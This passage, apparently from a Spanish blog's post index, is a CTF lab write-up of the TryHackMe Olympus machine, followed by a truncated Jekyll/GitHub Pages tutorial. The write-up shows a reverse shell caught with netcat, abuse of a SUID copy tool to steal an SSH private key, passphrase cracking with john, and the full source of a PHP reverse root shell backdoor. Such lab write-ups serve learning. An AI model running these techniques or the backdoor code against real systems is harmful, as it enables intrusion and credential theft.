nro de puerto local.Cargamos la shell desde el navegador con:http://chat.olympus.thm/uploads/99e7c69732975b95791508afdabc5057.phpConfirmamos conexion┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ nc -lvnp 4321listening on [any] 4321 ...connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 46000Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 16:49:33 up 1:49, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)/bin/sh: 0: can't access tty; job control turned off$ Bien, estamos dentro. Vamos a estabilizar la shell lo primero[...]$ which python2 python3/usr/bin/python3$ python3 -c \"import pty; pty.spawn('/bin/bash')\"www-data@olympus:/$ Y empezamos a brujulear …[...]www-data@olympus:/$ pwdpwd/www-data@olympus:/$ cd homecd homewww-data@olympus:/home$ lslszeuswww-data@olympus:/home$ cd zeuscd zeuswww-data@olympus:/home/zeus$ lslssnap user.flag zeus.txtwww-data@olympus:/home/zeus$ cat user.flagcat user.flagflag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}www-data@olympus:/home/zeus$ cat zeus.txtcat zeus.txtHey zeus !I managed to hack my way back into the olympus eventually.Looks like the IT kid messed up again !I've now got a permanent access as a super user to the olympus. - Prometheus.www-data@olympus:/home/zeus$ OK, hemos conseguido la segunda flag y un mensaje de Prometheus a su colega Zeus poniendo a caldo al chico de IT y alardeando de disponer de un acceso permanente como super usuario al server.Seguimos trasteando un poco a ver qué encontramos.[...]www-data@olympus:/home/zeus$ ls -lals -latotal 48drwxr-xr-x 7 zeus zeus 4096 Apr 19 08:40 .drwxr-xr-x 3 root root 4096 Mar 22 15:12 ..lrwxrwxrwx 1 root root 9 Mar 23 08:58 .bash_history -&gt; /dev/null-rw-r--r-- 1 zeus zeus 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 zeus zeus 3771 Feb 25 2020 .bashrcdrwx------ 2 zeus zeus 4096 Mar 22 15:13 .cachedrwx------ 3 zeus zeus 4096 Apr 14 09:56 .gnupgdrwxrwxr-x 3 zeus zeus 4096 Mar 23 08:33 .local-rw-r--r-- 1 zeus zeus 807 Feb 25 2020 .profiledrwx------ 2 zeus zeus 4096 Apr 14 10:35 .ssh-rw-r--r-- 1 zeus zeus 0 Mar 22 15:13 .sudo_as_admin_successfuldrwx------ 3 zeus zeus 4096 Apr 14 09:56 snap-rw-rw-r-- 1 zeus zeus 34 Mar 23 08:34 user.flag-r--r--r-- 1 zeus zeus 199 Apr 15 07:28 zeus.txtwww-data@olympus:/home/zeus$ La teoría nos dice que el directorio /.ssh  es donde se almacenan, de existir, las claves pública id_rsa.pub  y privada id_rsa necesarias para acceder por ssh (recordemos que el puerto 22/tcp aparecía abierto).El problema ? … el directorio pertenece a zeus y no tenemos acceso con nuestro usuario actual www-data. Toca escalar privilegios.Escalado de privilegiosTiramos por los clásicos y buscamos enumerar binarios con el bit SUID activado.[...]www-data@olympus:/home/zeus$ find / -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null&lt; find / -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null-rwsr-xr-x 1 root root 142696 Feb 23 18:25 /usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-- 1 root messagebus 51344 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 473576 Dec 2 2021 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 22840 Feb 21 12:58 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-xr-x 1 zeus zeus 17728 Apr 18 09:27 /usr/bin/cputils-rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo-rwsr-xr-x 1 root root 55528 Feb 7 13:33 /usr/bin/mount-rwsr-xr-x 1 root root 88464 Jul 14 2021 /usr/bin/gpasswd-rwsr-sr-x 1 daemon daemon 55560 Nov 12 2018 /usr/bin/at-rwsr-xr-x 1 root root 31032 Feb 21 12:58 /usr/bin/pkexec-rwsr-xr-x 1 root root 67816 Feb 7 13:33 /usr/bin/su-rwsr-xr-x 1 root root 85064 Jul 14 2021 /usr/bin/chfn-rwsr-xr-x 1 root root 53040 Jul 14 2021 /usr/bin/chsh-rwsr-xr-x 1 root root 68208 Jul 14 2021 /usr/bin/passwd-rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount-rwsr-xr-x 1 root root 39144 Feb 7 13:33 /usr/bin/umount-rwsr-xr-x 1 root root 44784 Jul 14 2021 /usr/bin/newgrp-rwsr-xr-x 1 root root 123560 Apr 8 19:36 /snap/snapd/15534/usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 123560 Jun 15 13:41 /snap/snapd/16292/usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 85064 Jul 14 2021 /snap/core20/1434/usr/bin/chfn-rwsr-xr-x 1 root root 53040 Jul 14 2021 /snap/core20/1434/usr/bin/chsh-rwsr-xr-x 1 root root 88464 Jul 14 2021 /snap/core20/1434/usr/bin/gpasswd-rwsr-xr-x 1 root root 55528 Feb 7 13:33 /snap/core20/1434/usr/bin/mount-rwsr-xr-x 1 root root 44784 Jul 14 2021 /snap/core20/1434/usr/bin/newgrp-rwsr-xr-x 1 root root 68208 Jul 14 2021 /snap/core20/1434/usr/bin/passwd-rwsr-xr-x 1 root root 67816 Feb 7 13:33 /snap/core20/1434/usr/bin/su-rwsr-xr-x 1 root root 166056 Jan 19 2021 /snap/core20/1434/usr/bin/sudo-rwsr-xr-x 1 root root 39144 Feb 7 13:33 /snap/core20/1434/usr/bin/umount-rwsr-xr-- 1 root systemd-resolve 51344 Jun 11 2020 /snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 473576 Dec 2 2021 /snap/core20/1434/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 85064 Mar 14 08:26 /snap/core20/1518/usr/bin/chfn-rwsr-xr-x 1 root root 53040 Mar 14 08:26 /snap/core20/1518/usr/bin/chsh-rwsr-xr-x 1 root root 88464 Mar 14 08:26 /snap/core20/1518/usr/bin/gpasswd-rwsr-xr-x 1 root root 55528 Feb 7 13:33 /snap/core20/1518/usr/bin/mount-rwsr-xr-x 1 root root 44784 Mar 14 08:26 /snap/core20/1518/usr/bin/newgrp-rwsr-xr-x 1 root root 68208 Mar 14 08:26 /snap/core20/1518/usr/bin/passwd-rwsr-xr-x 1 root root 67816 Feb 7 13:33 /snap/core20/1518/usr/bin/su-rwsr-xr-x 1 root root 166056 Jan 19 2021 /snap/core20/1518/usr/bin/sudo-rwsr-xr-x 1 root root 39144 Feb 7 13:33 /snap/core20/1518/usr/bin/umount-rwsr-xr-- 1 root systemd-resolve 51344 Apr 29 12:03 /snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 473576 Mar 30 13:03 /snap/core20/1518/usr/lib/openssh/ssh-keysignwww-data@olympus:/home/zeus$Entre el listado que obtenemos aparece un tal /usr/bin/cputils  que llama mi atención. Por qué ? porque no se lo que es.Buscamos en Google. Nada :(Intentamos ver su página man[...]www-data@olympus:/home/zeus$ man cputilsman cputilsNo manual entry for cputilswww-data@olympus:/home/zeus$El nombre da a pensar que se trate de una utilidad para copiar cosas, por lo de cp, pero a saber. Hay que salir de dudas.[...]www-data@olympus:/home/zeus$ cputilscputils ____ ____ _ _ _ / ___| _ \\ _ _| |_(_) |___ | | | |_) | | | | __| | / __|| |___| __/| |_| | |_| | \\__ \\ \\____|_| \\__,_|\\__|_|_|___/ Enter the Name of Source File: zeus.txtzeus.txtEnter the Name of Target File: /tmp/copia_zeus.txt/tmp/copia_zeus.txtFile copied successfully.www-data@olympus:/home/zeus$www-data@olympus:/home/zeus$ ls -la /tmp/copia_zeus.txtls -la /tmp/copia_zeus.txt-rw-rw-rw- 1 zeus www-data 199 Aug 6 19:17 /tmp/copia_zeus.txtwww-data@olympus:/home/zeus$ Qué hemos hecho ? Copiar un fichero desde nuestra ubicación al directorio /tmp . Comprobar que se ha copiado. Qué hemos averiguado ? Que efectivamente cputils es una utilidad que nos permite copiar ficheros entre diferentes ubicaciones, pero no solo eso … Que al ejecutarla y copiar un fichero de un sitio a otro, el fichero copiado cambia sus permisos y el grupo al que pertenece. [...]# el fichero en su ubicación originalwww-data@olympus:/home/zeus$ ls -la[...]-r--r--r-- 1 zeus zeus 199 Apr 15 07:28 zeus.txtwww-data@olympus:/home/zeus$ # el fichero copiado a /tmpwww-data@olympus:/home/zeus$ ls -la /tmp/copia_zeus.txt[...]-rw-rw-rw- 1 zeus www-data 199 Aug 6 19:17 /tmp/copia_zeus.txtwww-data@olympus:/home/zeus$ Y si utilizamos esto para copiar la clave privada ssh ?[...]www-data@olympus:/home/zeus$ cputilscputils ____ ____ _ _ _ / ___| _ \\ _ _| |_(_) |___ | | | |_) | | | | __| | / __|| |___| __/| |_| | |_| | \\__ \\ \\____|_| \\__,_|\\__|_|_|___/ Enter the Name of Source File: .ssh/id_rsa.ssh/id_rsaEnter the Name of Target File: /tmp/zeus_id_rsa/tmp/zeus_id_rsaFile copied successfully.www-data@olympus:/home/zeus$ ls -la /tmp/zeus_id_rsals -la /tmp/zeus_id_rsa-rw-rw-rw- 1 zeus www-data 2655 Aug 6 19:49 /tmp/zeus_id_rsawww-data@olympus:/home/zeus$ cat /tmp/zeus_id_rsacat /tmp/zeus_id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2iWQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2[...]-----END OPENSSH PRIVATE KEY-----www-data@olympus:/home/zeus$ OK. Copiamos la clave desde el terminal a un fichero en local y lo guardamos en nuestro directorio de trabajo como zeus_id_rsa. Probamos a conectarnos con el server via ssh utilizando esta clave.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sudo ssh -i zeus_id_rsa zeus@10.10.129.191[sudo] password for ewan67: The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:4: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.Enter passphrase for key 'zeus_id_rsa': Significado de las flags: -i : identity_file.Mal rollo, la clave tiene una passphrase que desconocemos.Tiramos de ssh2john (para transformar la clave al formato de John The Reaper) y del propio john para crakearla.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ ssh2john zeus_id_rsa &gt; zeus_id_rsa.hash┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus_id_rsa.hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashesCost 2 (iteration count) is 16 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusxxxxxxxxx (zeus_id_rsa)1g 0:00:01:27 DONE (2022-08-06 22:12) 0.01145g/s 17.22p/s 17.22c/s 17.22C/s maurice..bunnyUse the \"--show\" option to display all of the cracked passwords reliablySession completed. Con la clave anterior volvemos a intentar la conexion ssh.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sudo ssh -i zeus_id_rsa zeus@10.10.129.191[sudo] password for ewan67: The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:7: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.Enter passphrase for key 'zeus_id_rsa': Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)[...]Last login: Sat Jul 16 07:52:39 2022zeus@olympus:~$ Ahora viene la parte donde echamos mano de ese fichero que todos guardamos como oro en paño en nuestro ordenador con un listado de comandos “mágicos”. Tras varias pruebas con el mio, doy con esto:[...]zeus@olympus:~$ find / -type f -group zeus 2&gt;/dev/null/home/zeus/zeus.txt/home/zeus/user.flag/home/zeus/.sudo_as_admin_successful/home/zeus/.bash_logout/home/zeus/.ssh/authorized_keys/home/zeus/.ssh/id_rsa/home/zeus/.ssh/id_rsa.pub/home/zeus/snap/lxd/common/config/config.yml/home/zeus/.gnupg/pubring.kbx/home/zeus/.gnupg/trustdb.gpg/home/zeus/.bashrc/home/zeus/.profile/home/zeus/.cache/motd.legal-displayed/usr/bin/cputils/var/www/olympus.thm/public_html/~webmaster/search.php/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php/var/crash/_usr_bin_cp-utils.1000.crash/proc/1165/task/1165/fdinfo/0/proc/1165/task/1165/fdinfo/1[...]zeus@olympus:~$ Un listado de los ficheros a los que tiene acceso el grupo zeus en el que hay dos que nos llaman la atención./var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.phpFijaros que estos ficheros no cuelgan de /var/www/olympus.thm/public_html/  sino de /var/www/html/  con lo que deberemos acceder a ellos directamente por IP.Cargamos en un navegador la URL:http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.htmlNada, ni tirando del código fuente. Probamos con la siguientehttp://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.phpNos pinta esto:Echamos un veo al código fuente&lt;form name=\"auth\" method=\"POST\"&gt;Password: &lt;input type=\"password\" name=\"password\" /&gt;&lt;/form&gt;Lo espartano del código HTML nos da dos pistas: El propio fichero es el target del formulario dado que no hay atributo action establecido. Se envía directamente, sin ninguna función js que controle el contenido del input “password”, con lo que es probable que esa validación la haga el propio fichero en el lado servidor. Si el propio fichero VIGQFQFMYOST.php es el encargado de gestionar la request POST, nos interesa conocer su contenido.zeus@olympus:~$ cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -latotal 12drwxrwx--x 2 root zeus 4096 Jul 15 20:55 .drwxr-xr-x 3 www-data www-data 4096 May 1 09:01 ..-rwxr-xr-x 1 root zeus 0 Apr 14 09:54 index.html-rwxr-xr-x 1 root zeus 1589 Jul 15 20:55 VIGQFQFMYOST.phpzeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php &lt;?php$pass = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";if(!isset($_POST[\"password\"]) || $_POST[\"password\"] != $pass) die('&lt;form name=\"auth\" method=\"POST\"&gt;Password: &lt;input type=\"password\" name=\"password\" /&gt;&lt;/form&gt;');set_time_limit(0);$host = htmlspecialchars(\"$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\", ENT_QUOTES, \"UTF-8\");if(!isset($_GET[\"ip\"]) || !isset($_GET[\"port\"])) die(\"&lt;h2&gt;&lt;i&gt;snodew reverse root shell backdoor&lt;/i&gt;&lt;/h2&gt;&lt;h3&gt;Usage:&lt;/h3&gt;Locally: nc -vlp [port]&lt;/br&gt;Remote: $host?ip=[destination of listener]&amp;port=[listening port]\");$ip = $_GET[\"ip\"]; $port = $_GET[\"port\"];$write_a = null;$error_a = null;$suid_bd = \"/lib/defended/libc.so.99\";$shell = \"uname -a; w; $suid_bd\";chdir(\"/\"); umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) die(\"couldn't open socket\");$fdspec = array(0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\"));$proc = proc_open($shell, $fdspec, $pipes);if(!is_resource($proc)) die();for($x=0;$x&lt;=2;$x++) stream_set_blocking($pipes[x], 0);stream_set_blocking($sock, 0);while(1){ if(feof($sock) || feof($pipes[1])) break; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); } if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); } if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }}fclose($sock);for($x=0;$x&lt;=2;$x++) fclose($pipes[x]);proc_close($proc);?&gt;zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ Analizamos el código del fichero y vemos que en la primer línea se define una variable $pass, seguida de un bloque que la compara con el contenido del input “password” del form.Volvemos al navegador, rellenamos el input con el valor de $pass y le damos al Enter. Nos aparece lo siguiente:Un mensaje con intrucciones para cargar una shell reversa que promete acceso como root. La puerta trasera de la que hablaba Prometheus quizas ?Seguimos las instrucciones del mensaje Iniciamos un netcat escuchando en el puerto 4433 en este caso. Cargamos la URL con la info necesaria. 10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.xx.xx&amp;port=4433Nos vamos al terminal con el nc que hemos puesto a escuchar en el puerto 4433 y una vez conectados empezamos a trastear:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ nc -lvnp 4433listening on [any] 4433 ...connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 56506Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 22:48:48 up 1:18, 1 user, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATzeus pts/0 10.18.xx.xx 21:34 35:30 0.04s 0.04s -bashwhoamirootpython3 -c \"import pty;pty.spawn('/bin/bash')\"root@olympus:/# pwdpwd/root@olympus:/# cd rootcd rootroot@olympus:/root# ls -lals -latotal 44drwx------ 7 root root 4096 Apr 24 18:06 .drwxr-xr-x 19 root root 4096 Mar 22 14:53 ..lrwxrwxrwx 1 root root 9 Mar 23 08:58 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 Mar 22 15:18 .cachedrwxr-xr-x 3 root root 4096 Mar 22 15:44 .local-rw------- 1 root root 2866 Apr 24 18:06 .mysql_history-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwx------ 2 root root 4096 Mar 22 15:12 .sshdrwxr-xr-x 3 root root 4096 Mar 22 15:26 config-rw-r--r-- 1 root root 1576 Apr 18 09:32 root.flagdrwx------ 3 root root 4096 Mar 22 15:12 snaproot@olympus:/root# root@olympus:/root# cat root.flagcat root.flag ### Congrats !! ### ( . ) ) ( (| . ) )\\/ ( ( ( * ( (( / ))\\)) ( ) ) ( \\ )\\( | ))( ) (| &gt;) ))/ | )/ \\(( ) \\ ( ( . -. V )/ )( ( \\ / . \\ . \\)) )) )( ( | | ) . ( / )( ,')) \\ / \\( `. ) (\\&gt; ,'/__ )) __`. / ( \\ | / ___ ( \\/ ___ \\ | ( ( \\.) |/ / \\__ __/ \\ \\| )) . \\. |&gt; \\ | __ | / &lt;| / )/ \\____/ :..: \\____/ \\ &lt; ) \\ (|__ . / ;: \\ __| ) ( (( )\\) ~--_ -- -- _--~ / )) \\ ( | || || | ( / \\. | ||_ _|| | / &gt; : | ~V+-I_I_I-+V~ | : (. ( \\: T\\ _ _ /T : ./ \\ : T^T T-+-T T^T ;&lt; \\..`_ -+- _' ) . `--=.._____..=--'. ./ You did it, you defeated the gods. Hope you had fun ! flag{xxxxxxxxxxxxxxxxxxxx}PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;) (Hint : regex can be usefull)root@olympus:/root# Tenemos la tercer flag.Como parte del mensaje con la flag, nos cuentan que Prometheus ha dejado una cuarta bandera escondida en algun sitio y nos recomiendan logarnos como root sobre ssh para poder buscarla mediante algun comando basado en regex. Por otra parte, el hint de esta última bandera os dice que podría estar en el directorio /etc .[...]root@olympus:/root# cd /etccd /etcroot@olympus:/etc# grep -irl flag{grep -irl flag{ssl/private/.b0nus.fl4groot@olympus:/etc# cat ssl/private/.b0nus.fl4gcat ssl/private/.b0nus.fl4gHere is the final flag ! Congrats !flag{xxxxxxxxxxxxxxxx}As a reminder, here is a usefull regex :grep -irl flag{Hope you liked the room ;)root@olympus:/etc# Significado de las flags del comando grep: -i : Ignore case distinctions in patterns and input data. -r : Recursivo Read all files under each directory, recursively. -l : Suprime la salida normal y en su lugar imprime el nombre de cada archivo de entrada.FinalEnhorabuena a los que habéis llegado hasta aquí. Espero que esta guía os haya resultado de ayuda.Sed buenos si no hay una opción mejor." }, { "title": "Tutorial Github Pages + Jekyll + Chirpy", "url": "/posts/tutorial-gh-pages/", "categories": "Tutos", "tags": "github pages, tutos, jekyll, chirpy", "date": "2022-08-01 10:10:00 +0100", "snippet": "Intro.Ahora que en Agosto baja un poco la carga de curro me propuse aprovechar el tiempo y darle salida a una idea a la que llevaba tiempo dándole vueltas: montar un sitio web donde publicar manuales de cosecha propia, notas de CTFs en español, resúmenes que elaboré para preparar algún exámen de certificación, documentación y cosas por el estilo que llevan tiempo deambulando por mi ordenador. El objetivo ? … que pudiesen serle útiles a alguien y devolver modestamente a la comunidad una pequeñísima parte de todo lo que me ha brindado.Buscando un espacio que cubriese mis necesidades se me ocurrió echar un ojo a GitHub Pages. Si bien había oído hablar de este servicio (llevo tiempo trabajando con GitHub como repositorio de código) nunca le había prestado demasiada atención.El servicio lo presentan como algo sencillo de montar y mantener, sin coste, basado en git, sin el poder de un CMS pero también sin sus complicaciones … en resumen: un recurso ideal para disponer de una página personal en la que compartir contenido de un modo ágil, digno y asequible.Tras un par de pruebas con los temas que ofrece el servicio por defecto me decidí por montar mi repo personal con Jekyll y Chirpy, el tema que más me gustó de los que hay disponibles aquí.Al hilo del párrafo que abre el post, me pareció buena idea aprovechar el viaje y documentar el proceso. He aquí el resultado. Nota importante: el contenido de esta entrada puede resultar demasiado básico a quienes cuenten con cierta experiencia en ámbitos como Git, Ruby o Linux, pero su objetivo es justamente ese: volver asequible el proceso a quienes se embarquen por primera vez en estas lides. Por otra parte, y para quienes quieran profundizar, dejo enlaces a la documentación original en cada apartado.Algunas generalidades antes de empezar …Como en todo proyecto basado en Github tenemos que tener claro los dos entornos en los que vamos a movernos: Por una lado Github como tal, al que accederemos via el navegador. Doy por hecho que disponéis de una cuenta; de no ser así, el primer paso es registrarse. Por simplicidad, de aquí en adelante me voy a referir a Github con la abreviatura GH. Por otro lado tendremos nuestro entorno de desarrollo local, disponible en nuestra propia máquina y en el que realizaremos los cambios que luego publicaremos en GH. En mi caso utilizo un ordenador con Kali, una distribución de Linux basada en Debian. Por simplicidad, de aquí en adelante me voy a referir a nuestra máquina como local. Configuración de nuestro sitio en GH.En este paso crearemos nuestro nuevo sitio en GH utilizando el tema Chirpy. Para ello … Iniciamos nuestro navegador web y nos logueamos en GH. En la misma pestaña (o en una nueva, eso va en gustos) cargamos la siguiente URL para clonar el repositorio de Chirpy … https://github.com/cotes2020/chirpy-starter/generate Se nos muestra la siguiente vista: Completamos el input Repository name con el valor: &lt;mi_usuarioGH&gt;.github.io donde &lt;mi_usuarioGH&gt; es vuestro usuario de GH tal como aparece en el desplegable Owner que esta a la izquierda. Es fundamental que lo escribáis tal cual. Nos aseguramos que el checkbox Public esté seleccionado. Damos al boton Create repository from template. NOTA: Para mas información sobre este paso podéis visitar la página oficial de Chirpy aquí. En nuestro caso hemos utilizado la opcion 1.Con esto, por el momento, hemos terminado con la parte de GH vía web.Configuración de nuestro entorno local.Para utilizar Jekyll en nuestro ordenador necesitamos tener instalados los siguiente paquetes: Ruby (lo comprobamos ejecutando en nuestro terminal $ ruby -v) RubyGems (lo comprobamos ejecutando en nuestro terminal $ gem -v) GCC (lo comprobamos ejecutando en nuestro terminal $ gcc -v y $ g++ -v) Make (lo comprobamos ejecutando en nuestro terminal $ make -v) En caso de necesidad, podemos instalarlos ejecutando desde nuestro terminal:$ sudo apt install ruby-full… para la parte de Ruby, y …$ sudo apt install build-essentialpara el resto de paquetes requeridos. NOTA: Para mas información sobre los requisitos de Jekyll en otros sistemas operativos podéis ver la documentación oficial aquí.Comprobados los prerequisitos de Jekyll pasamos a instalarlo. Esto lo haremos via gem, como el usuario root, ejecutando el siguiente comando desde nuestro terminal:# gem install jekyll bundler Nota: la instalación es posible que os pida un par de veces vuestra contraseña de usuario local.Una vez tenemos jekyll y bundler instalados en nuestro equipo, salimos de root [Ctrl + d] y procedemos a crear la carpeta donde alojaremos nuestro repositorio de GH. Para ello ejecutamos desde la ubicación que deseemos (nuestro directorio home por ejemplo) …$ mkdir &lt;mi_usuarioGH&gt;$ cd &lt;mi_usuarioGH&gt;Y desde alli nos traemos nuestro repositorio de GH con …$ git clone https://github.com/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io.giUna vez finalizado el proceso, nos movemos al directorio que se acaba de crear con la descarga …$ cd &lt;mi_usuarioGH&gt;.github.io.giEjecuntando un ls en él deberíamos ver algo asi …┌──(ewan㉿kali)-[~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io]└─$ lsGemfile Gemfile.lock LICENSE README.md _config.yml _data _plugins _posts _tabs assets index.html toolsBien, ahora vamos a editar algunos ficheros de este directorio antes de generar nuestra sitio con bundle. Vamos a ello … Nota: un par de líneas más abajo os explico esto de generar nuestro sitio y la mecánica que hay en juego.El primer fichero que vamos a editar es el _config.yml que se encuentra en nuestro directorio ~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io (aka nuestro directorio raíz del proyecto si lo habéis creado en el home de vuestro equipo).Lo abrimos en nuestro editor preferido, le echamos un ojo, y modificamos los siguientes valores: baseurl: ''     en nuestro caso vamos a dejarlo vacío, tal como viene. lang: es-ES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;para que nuestro site se vea en español. Nota: podéis ver los idiomas disponibles en la carpeta &lt;mi_usuarioGH&gt;.github.io/_data/locales/. timezone: Europe/London&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aquí poned lo que os corresponda. title: &lt;mi_usuarioGH&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;podéis poner como título del sitio lo que os apetezca, en mi caso he optado por mi nombre de usuario de GH. Este es el texto que va a aparecer, entre otros lugares, debajo de vuestro avatar. tagline: Lo que quieras&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;este es el texto que va a aparecer en el site justo debajo del title. url: 'https://&lt;mi_usuarioGH&gt;.github.io'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;muy importante este parámetro, completarlo con vuestro nombre de usuario de GH como hemos venido haciendo en pasos anteriores. Vuestros usuarios en redes (pego pantallazo, reemplazar lo que corresponda) …Estos son los valores que van a aparecer asociados a los iconos ubicados al final del lateral izquierdo de la página. avatar: /assets/common/&lt;mi_avatar.jpg|png&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esta es la imagen que va a aparecer en el lateral izquierdo. Tened en cuenta almacenarla en la carpeta ~/&lt;mi_usuarioGH&gt;.github.io/assets/common/. Nota: deberéis crear la carpeta /commonEl resto de valores los dejamos tal cual. Guardamos los cambios.Volvemos al terminal, nos posicionamos en nuestro directorio raíz ~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io y ejecutamos:$ bundleCon este comando “compilamos” nuestro sitio en local. Si echáis un ojo a las carpetas que cuelgan del directorio raíz veréis que se ha creado una nueva llamada _site en la que están los ficheros que forman nuestro nuevo sitio web.Ejecutamos$ bundle exec jekyll spara iniciar el servidor que trae Jekyll y poder navegar por nuestro sitio en local.Abrimos una pestaña en el navegador y visitamoshttp://localhost:4000Si todo ha ido ok, estaremos viendo nuestro flamante sitio web basado en Jekyll y con el tema Chirpy.Cada vez que ejecutemos bundle recrearemos nuestro sitio a partir de los ficheros que tengamos en nuestro directorio raíz. Si hemos iniciado el servidor y hacemos algún cambio, el proceso regenera nuestro site de manera automática, sin necesidad de pararlo y volverlo a iniciar. Nota: para parar el servidor de jekyll ejecutamos Ctrl + cNuestro primer post.Ahora vamos a crear nuestro primer post. Va a ser algo sencillo y no voy a entrar en muchos detalles al respecto. Apenas cuente con un poco de tiempo tengo idea de publicar una segunda parte de esta guía con algo más de información. Los mas ansiosos podéis echar un ojo a la documentación oficial disponible pinchando en los links que os he ido dejando.En nuestro editor de texto preferido creamos un fichero nuevo y lo guardamos en la carpeta /_posts de nuestro directorio raíz (es decir, en: ~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io/_posts/) con el siguiente formato 